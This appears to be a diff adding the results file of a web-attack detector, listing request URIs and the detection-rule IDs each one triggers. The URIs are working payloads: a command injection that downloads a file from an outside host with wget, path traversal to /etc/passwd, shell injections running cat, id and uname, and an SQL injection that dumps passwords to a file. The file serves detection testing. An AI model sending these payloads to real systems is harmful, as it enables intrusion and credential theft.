@@ -1,0 +1,11 @@
+---------------------- Statistics of URIs analyzed------------------------
+[10] input, [2] clean, [8] attacks
+--------------------------- Analysis results -----------------------------
+Packet [1]	Uri [/appliancews/getLicense?hostName=$(/usr/bin/wget%20http://1.1.1.1:12345/file%20-O%20/tmp/dsifnfnfdwsFFS)]	Nattacks [8]	[920273]	[932105]	[932130]	[932150]	[932160]	[942431]	[942432]	[949110]
+Packet [2]	Uri [/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd%00&Action=blast&hidenav=1]	Nattacks [10]	[920270]	[920271]	[920272]	[920273]	[930100]	[930110]	[930120]	[932160]	[942460]	[949110]
+Packet [3]	Uri [/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../home/dna/spool/.pfile]	Nattacks [5]	[920273]	[930100]	[930110]	[942460]	[949110]
+Packet [4]	Uri [/ping.cgi?IPAddr1=12&IPAddr3=12&IPAddr2=12&ping=Ping&IPAddr4=12&ping_IPAddr=12.12.12.12%3B+cat%20/etc/passwd]	Nattacks [5]	[920273]	[930120]	[932100]	[932160]	[949110]
+Packet [5]	Uri [/ping.cgi?IPAddr1=12&IPAddr3=12&IPAddr2=12&ping=Ping&IPAddr4=12&ping_IPAddr=12.12.12.12%26+ls%20/etc/]	Nattacks [3]	[920273]	[932100]	[949110]
+Packet [7]	Uri [/ossim/dashboard/sections/widgets/data/gauge.php?&type=alarm&wtype=blah&asset=1&height=1&value=a%3A1%3A%7Bs%3A4%3A%22type%22%3Bs%3A67%3A%22pass+from+users+INTO+OUTFILE+%27%2Ftmp%2F1.1.1.1_pass_tshark.pcap%27--+-%22%3B%7D]	Nattacks [12]	[920273]	[942190]	[942260]	[942300]	[942370]	[942480]	[942430]	[942440]	[942431]	[942460]	[942432]	[949110]
+Packet [9]	Uri [/cgi-bin/userConfig.cgi?func=cloudPersonalSmtp&sid=SIDVALUE&hash=`(echo;id;uname%20-a)>%262`]	Nattacks [7]	[920273]	[932105]	[932110]	[942110]	[942431]	[942432]	[949110]
+Packet [10]	Uri [/cgi-bin/filemanager/utilRequest.cgi?func=cancel_trash_recovery&sid=SIDVALUE&pid=`id>/tmp/pwned`]	Nattacks [5]	[920273]	[932100]	[942110]	[942432]	[949110]
